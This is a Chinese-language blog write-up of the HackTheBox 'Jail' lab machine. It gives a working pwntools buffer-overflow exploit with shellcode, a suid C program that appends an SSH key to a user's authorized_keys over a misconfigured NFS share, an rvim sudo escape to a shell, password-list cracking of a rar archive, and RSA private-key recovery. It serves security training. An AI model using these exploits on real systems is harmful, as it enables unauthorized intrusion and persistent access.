@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Jail - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;45  10.10.10.34                                                                                                              端口扫描需要全端口： 12345678910">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jail - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2021/05/20/Jail-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;45  10.10.10.34                                                                                                              端口扫描需要全端口： 12345678910">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052001.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052002.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052003.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052004.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052005.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052006.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052007.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052008.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052009.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052010.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052011.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052012.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052013.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052014.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052015.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052016.jpg">
+<meta property="article:published_time" content="2021-05-20T07:05:04.000Z">
+<meta property="article:modified_time" content="2021-05-20T07:07:45.506Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052001.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                彼女募集中
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/about/"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Jail - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Jail - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-05-20T07:05:04.000Z" itemprop="datePublished" class="page-time">
+  2021-05-20
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-34"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.34</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#nfs"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">nfs</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#目录扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">目录扫描</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#jail"><span class="post-toc-number">4.</span> <span class="post-toc-text">jail</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#bof-exploit"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">bof exploit</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-py"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">exp.py</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#frank-信息"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">frank  信息</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#NFS"><span class="post-toc-number">5.</span> <span class="post-toc-text">NFS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#nfsshare"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">nfsshare</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell-c"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">shell.c</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">6.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#adm-信息"><span class="post-toc-number">7.</span> <span class="post-toc-text">adm 信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#frank-to-adm"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">frank to adm</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">8.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#密码字典"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">密码字典</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#私钥"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">私钥</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">9.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">10.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Jail-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Jail - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-05-20 15:05:04" datetime="2021-05-20T07:05:04.000Z"  itemprop="datePublished">2021-05-20</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.eu/home/machines/profile/45" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/45</a></p>
+</li>
+<li><h2 id="10-10-10-34"><a href="#10-10-10-34" class="headerlink" title="10.10.10.34"></a>10.10.10.34</h2></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要全端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  Jail nmap -p- 10.10.10.34</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 14:24 CST</span><br><span class="line">Nmap scan report for 10.10.10.34</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 65529 filtered ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">7411/tcp  open  daqstream</span><br><span class="line">20048/tcp open  mountd</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1624.97 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h2><p>nfs可以发现两个目录无限制：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> showmount -e 10.10.10.34</span></span><br><span class="line">Exports list on 10.10.10.34:</span><br><span class="line">/opt                                *</span><br><span class="line">/var/nfsshare                       *</span><br></pre></td></tr></table></figure>
+
+<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描可以扫到jailuser，需要中等字典：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.34/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50</span><br><span class="line"></span><br><span class="line">/jailuser             (Status: 301) [Size: 236] [--&gt; http://10.10.10.34/jailuser/]</span><br></pre></td></tr></table></figure>
+
+<p>里面是jail程序文件和源码：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h1><p>这个就是7411端口的服务，根据源码和程序调试可以发现bof，源码里debug模式可以得到userpass buffer，就是基础的bof：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Leaked buffer address on remote</span><br><span class="line">userpass buffer addr 0xffffd610</span><br><span class="line">offset 28</span><br><span class="line"># 0xffffd610 + offset + 4 bytes of junk</span><br><span class="line">#buffer_offset &#x3D; 0xffffd610 + 32</span><br><span class="line">#buffer_offset &#x3D; hex(buffer_offset)</span><br><span class="line">#pint(buffer_offset)</span><br><span class="line">#Calculated buffer &#x3D; 0xffffd630</span><br></pre></td></tr></table></figure>
+
+<h2 id="bof-exploit"><a href="#bof-exploit" class="headerlink" title="bof exploit"></a>bof exploit</h2><p>就是直接执行shellcode：</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/34060" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/34060</a></li>
+</ul>
+<p>打到nobody shell：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052005.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "A"*28 + p32(0xffffd630) + shellcode</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">28</span> + <span class="string">"\x30\xd6\xff\xff"</span> + shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.10.10.34'</span>, <span class="number">7411</span>)</span><br><span class="line">print(r.recv(<span class="number">1024</span>))</span><br><span class="line">r.sendline(<span class="string">'USER admin'</span>)</span><br><span class="line">print(r.recv(<span class="number">1024</span>))</span><br><span class="line">r.sendline(<span class="string">'PASS '</span> + payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="frank-信息"><a href="#frank-信息" class="headerlink" title="frank  信息"></a>frank  信息</h2><p>当前nobody可以以frank身份运行/opt/logreader/logreader.sh，前面nfs看到有opt，所以下一步就是通过nfs打到frank：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052006.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h1><p>mount后的目录需要uid1000的用户才能访问，因为frank的uid是1000:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052007.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="nfsshare"><a href="#nfsshare" class="headerlink" title="nfsshare"></a>nfsshare</h2><p>实际用到的是nfsshare，用到的是nfs的配置错误导致suid继承，这样我们可以得到远程服务器上uid 1000的用户shell：</p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</a></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t nfs 10.10.10.34:/var/nfsshare miao1 -o nolock</span><br><span class="line">gcc shell.c -o shell -m32</span><br><span class="line">cp ../shell .</span><br><span class="line">chmod 4777 shell</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052008.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="shell-c"><a href="#shell-c" class="headerlink" title="shell.c"></a>shell.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc shell.c -o shell -m32</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setuid(<span class="number">1000</span>);</span><br><span class="line">FILE *fptr;</span><br><span class="line">fptr = fopen(<span class="string">"/home/frank/.ssh/authorized_keys"</span>, <span class="string">"a"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(fptr, <span class="string">"ssh-rsa XXXXXX"</span>);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>suid程序执行后，写入公钥到frank用户，ssh登录，得到user.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052009.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="adm-信息"><a href="#adm-信息" class="headerlink" title="adm 信息"></a>adm 信息</h1><p>rvim：</p>
+<ul>
+<li><a href="https://gtfobins.github.io/gtfobins/rvim/#sudo" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/rvim/#sudo</a></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052010.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="frank-to-adm"><a href="#frank-to-adm" class="headerlink" title="frank to adm"></a>frank to adm</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入命令模式</span></span><br><span class="line">py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052011.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>发现一个加密的keys.rar和密码提示信息：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052012.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>另外更深层目录发现另一个提示信息：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052013.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052014.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>根据解出来的这句话搜到这篇文章：</p>
+<ul>
+<li><a href="https://www.bbc.com/news/world-us-canada-42826582" target="_blank" rel="noopener">https://www.bbc.com/news/world-us-canada-42826582</a></li>
+</ul>
+<p>得到相关信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Frank Morris</span><br><span class="line">1962</span><br><span class="line">最后一位是符号</span><br></pre></td></tr></table></figure>
+
+<h2 id="密码字典"><a href="#密码字典" class="headerlink" title="密码字典"></a>密码字典</h2><p>根据这些信息可以生成密码字典：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 11 11 -t Morris1962^  &gt; password.txt</span><br></pre></td></tr></table></figure>
+
+<p>破解出rar密码，解压出一个公钥：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/rar2john keys.rar &gt; keys</span><br><span class="line">sudo john --wordlist=./password.txt keys</span><br><span class="line">Morris1962!</span><br><span class="line">unrar e keys.rar</span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到rootauthorizedsshkey.pub</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="私钥"><a href="#私钥" class="headerlink" title="私钥"></a>私钥</h2><p>根据公钥得到私钥：</p>
+<ul>
+<li><a href="https://github.com/Ganapati/RsaCtfTool" target="_blank" rel="noopener">https://github.com/Ganapati/RsaCtfTool</a></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Tools/RsaCtfTool/RsaCtfTool.py --publickey ./rootauthorizedsshkey.pub --private</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052015.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>ssh使用私钥登录，得到root.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052016.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a href="https://www.exploit-db.com/exploits/34060" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/34060</a></li>
+<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/rvim/#sudo" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/rvim/#sudo</a></li>
+<li><a href="https://www.quipqiup.com/" target="_blank" rel="noopener">https://www.quipqiup.com/</a></li>
+<li><a href="https://www.bbc.com/news/world-us-canada-42826582" target="_blank" rel="noopener">https://www.bbc.com/news/world-us-canada-42826582</a></li>
+<li><a href="https://en.wikipedia.org/wiki/June_1962_Alcatraz_escape_attempt#Frank_Morris" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/June_1962_Alcatraz_escape_attempt#Frank_Morris</a></li>
+<li><a href="https://github.com/Ganapati/RsaCtfTool" target="_blank" rel="noopener">https://github.com/Ganapati/RsaCtfTool</a></li>
+<li><a href="https://thecybergeek.co.uk/walkthrough/hackthebox/2021/02/06/HackTheBox-Jail.html" target="_blank" rel="noopener">https://thecybergeek.co.uk/walkthrough/hackthebox/2021/02/06/HackTheBox-Jail.html</a></li>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/45" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/45</a></li>
+<li>HackTheBox - Jail - YouTube<br><a href="https://www.youtube.com/watch?v=80-73OYcrrk&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=80-73OYcrrk&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-05-20T07:07:45.506Z" itemprop="dateUpdated">2021-05-20 15:07:45</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2021/05/20/Jail-HackTheBox/&title=《Jail - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
